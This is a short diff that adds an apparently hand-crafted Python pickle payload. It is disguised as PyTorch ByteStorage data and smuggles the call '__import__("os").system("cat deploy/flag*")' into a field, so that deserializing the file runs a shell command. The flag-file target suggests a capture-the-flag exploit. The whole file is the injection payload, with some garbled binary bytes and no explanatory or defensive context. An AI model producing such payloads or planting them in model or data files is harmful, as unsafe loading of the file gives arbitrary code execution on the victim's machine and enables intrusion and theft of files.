@@ -1,0 +1,5 @@
+ctorch
+ByteStorage
+N(S"__module__"
+S"__import__("os").system("cat deploy/flag*")"
+dÜb)Å.
